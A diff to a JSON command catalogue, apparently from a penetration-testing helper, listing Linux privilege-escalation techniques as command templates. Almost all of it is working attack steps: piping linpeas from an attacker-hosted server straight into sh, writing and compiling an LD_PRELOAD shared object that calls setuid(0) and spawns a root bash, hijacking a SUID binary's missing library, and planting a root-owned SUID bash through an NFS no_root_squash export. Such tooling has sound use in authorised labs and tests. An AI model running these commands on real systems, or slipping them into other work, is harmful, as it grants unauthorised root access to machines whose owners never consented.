@@ -4,9 +4,9 @@
       "name": "linpeas",
       "description": "PEASS-ng script that checks almost every Linux privesc vector and colour-codes the likely ones.",
       "commands": [
-        { "purpose": "On Kali: serve linpeas.sh from the folder holding it", "template": "python3 -m http.server {{LPORT}}", "intent": "transfer" },
-        { "purpose": "Run it straight from memory, nothing written to disk", "template": "curl -s http://{{LHOST}}:{{LPORT}}/linpeas.sh | sh", "intent": "enumerate" },
-        { "purpose": "No curl or want a saved copy: download it first", "template": "wget http://{{LHOST}}:{{LPORT}}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh", "intent": "transfer" },
+        { "purpose": "On Kali: serve linpeas.sh from the folder holding it (port 80, the listener keeps {{LPORT}})", "template": "sudo python3 -m http.server 80", "intent": "transfer" },
+        { "purpose": "Run it straight from memory, nothing written to disk", "template": "curl -s http://{{LHOST}}/linpeas.sh | sh", "intent": "enumerate" },
+        { "purpose": "No curl or want a saved copy: download it first", "template": "wget http://{{LHOST}}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh", "intent": "transfer" },
         { "purpose": "Run and keep the output for later reading", "template": "/tmp/linpeas.sh | tee /tmp/linpeas.txt", "intent": "enumerate" },
         { "purpose": "Read saved output with colours: red on yellow = near-certain vector, red = worth checking", "template": "less -R /tmp/linpeas.txt", "intent": "enumerate" }
       ]
@@ -15,7 +15,7 @@
       "name": "LinEnum",
       "description": "Older bash enumeration script; quieter output than linpeas, good second opinion.",
       "commands": [
-        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}:{{LPORT}}/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh", "intent": "transfer" },
+        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh", "intent": "transfer" },
         { "purpose": "Thorough run", "template": "/tmp/LinEnum.sh -t", "intent": "enumerate" },
         { "purpose": "Thorough run, search config/log files for a keyword, save a report", "template": "/tmp/LinEnum.sh -t -k password -r /tmp/linenum-report", "intent": "enumerate" }
       ]
@@ -24,7 +24,7 @@
       "name": "linux-exploit-suggester",
       "description": "les.sh: matches the kernel and package versions against known local privesc exploits.",
       "commands": [
-        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}:{{LPORT}}/les.sh -O /tmp/les.sh && chmod +x /tmp/les.sh", "intent": "transfer" },
+        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}/les.sh -O /tmp/les.sh && chmod +x /tmp/les.sh", "intent": "transfer" },
         { "purpose": "Run on the target; read 'highly probable' entries first", "template": "/tmp/les.sh", "intent": "enumerate" },
         { "purpose": "Run on Kali against a pasted uname -a string", "template": "./les.sh --uname \"<uname -a output>\"", "intent": "enumerate" }
       ]
@@ -34,7 +34,7 @@
       "description": "Watches new processes and file events without root; reveals cron jobs and root scripts.",
       "commands": [
         { "purpose": "Pick the right build: x86_64 = pspy64, i686 = pspy32", "template": "uname -m", "intent": "enumerate" },
-        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}:{{LPORT}}/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64", "intent": "transfer" },
+        { "purpose": "Download from your Kali web server", "template": "wget http://{{LHOST}}/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64", "intent": "transfer" },
         { "purpose": "Print commands and file events, scan every second; leave it a few minutes and look for UID=0", "template": "/tmp/pspy64 -pf -i 1000", "intent": "enumerate" }
       ]
     },
@@ -194,7 +194,8 @@
       "commands": [
         { "purpose": "What you may run as whom (NOPASSWD lines need no password)", "template": "sudo -l", "intent": "enumerate" },
         { "purpose": "Run an allowed binary as another user from the (user) column", "template": "sudo -u <user> <binary>", "intent": "exploit" },
-        { "purpose": "Allowed script: can you edit it or anything it calls?", "template": "ls -la <file>; cat <file>", "intent": "enumerate" }
+        { "purpose": "Allowed script: can you edit it or anything it calls?", "template": "ls -la <file>; cat <file>", "intent": "enumerate" },
+        { "purpose": "No sudo? doas rules give the same thing (permit nopass <user> as root cmd …)", "template": "cat /etc/doas.conf 2>/dev/null; find / -name doas.conf 2>/dev/null", "intent": "enumerate" }
       ]
     },
     {
@@ -214,7 +215,7 @@
     },
     { "name": "Sudo LD_PRELOAD with env_keep", "phase": "PrivEsc", "service": "shell", "applies": "linux", "needs": ["shell"], "yields": ["admin"], "when": "sudo -l shows env_keep+=LD_PRELOAD and you may run any command with sudo.", "tools": [], "commands": [
       { "purpose": "Confirm the env_keep line", "template": "sudo -l | grep -i ld_preload", "intent": "enumerate" },
-      { "purpose": "Compile the preload library (short C source in HackTricks' LD_PRELOAD section, saved as /tmp/pe.c)", "template": "gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c", "intent": "exploit" },
+      { "purpose": "Write the preload library source and compile it", "template": "printf '#include <stdlib.h>\\n#include <unistd.h>\\nvoid _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash -p\"); }\\n' > /tmp/pe.c && gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c", "intent": "exploit" },
       { "purpose": "Run any allowed sudo command with it preloaded", "template": "sudo LD_PRELOAD=/tmp/pe.so <binary>", "intent": "exploit" }
     ] },
     {
@@ -265,7 +266,7 @@
       "commands": [
         { "purpose": "List the shared objects a SUID binary loads; look for a writable or missing path", "template": "ldd <binary>", "intent": "enumerate" },
         { "purpose": "Confirm the library search path it was linked with (RPATH/RUNPATH)", "template": "readelf -d <binary> | grep -i path", "intent": "enumerate" },
-        { "purpose": "Drop any real library at that path and run the binary: the undefined-symbol error names the function to implement", "template": "cp /lib/x86_64-linux-gnu/libc.so.6 <path/lib.so> && <binary>", "intent": "enumerate" },
+        { "purpose": "Trace the binary: a library it fails to open in a folder you can write is the one to plant", "template": "strace <binary> 2>&1 | grep -iE 'open|access|no such file'", "intent": "enumerate" },
         { "purpose": "Write the payload: define that function to drop root privileges into a shell", "template": "printf '#include <stdlib.h>\\n#include <unistd.h>\\nvoid <function>() { setuid(0); system(\"/bin/sh -p\"); }\\n' > /tmp/hijack.c", "intent": "exploit" },
         { "purpose": "Compile it as a shared object at the path the binary loads", "template": "gcc -fPIC -shared -o <path/lib.so> /tmp/hijack.c", "intent": "exploit" },
         { "purpose": "Run the SUID binary so it loads the hijacked library", "template": "<binary>", "intent": "exploit" }
@@ -485,7 +486,8 @@
         { "purpose": "On the target: look for no_root_squash", "template": "cat /etc/exports", "intent": "enumerate" },
         { "purpose": "On Kali: list exports", "template": "showmount -e {{TARGET}}", "intent": "enumerate" },
         { "purpose": "On Kali: mount the share", "template": "mkdir -p /tmp/nfs && sudo mount -o rw,vers=3 {{TARGET}}:<path> /tmp/nfs", "intent": "exploit" },
-        { "purpose": "On Kali: drop a root-owned SUID bash (use the target's own bash if glibc differs)", "template": "sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod +s /tmp/nfs/rootbash", "intent": "exploit" },
+        { "purpose": "On the target: copy the target's own bash into the export (Kali's bash may need a newer glibc)", "template": "cp /bin/bash <path>/rootbash", "intent": "transfer" },
+        { "purpose": "On Kali, in the mounted export: make it root-owned SUID", "template": "sudo chown root:root /tmp/nfs/rootbash && sudo chmod 4755 /tmp/nfs/rootbash", "intent": "exploit" },
         { "purpose": "On the target: run it", "template": "<path>/rootbash -p", "intent": "exploit" }
       ]
     },
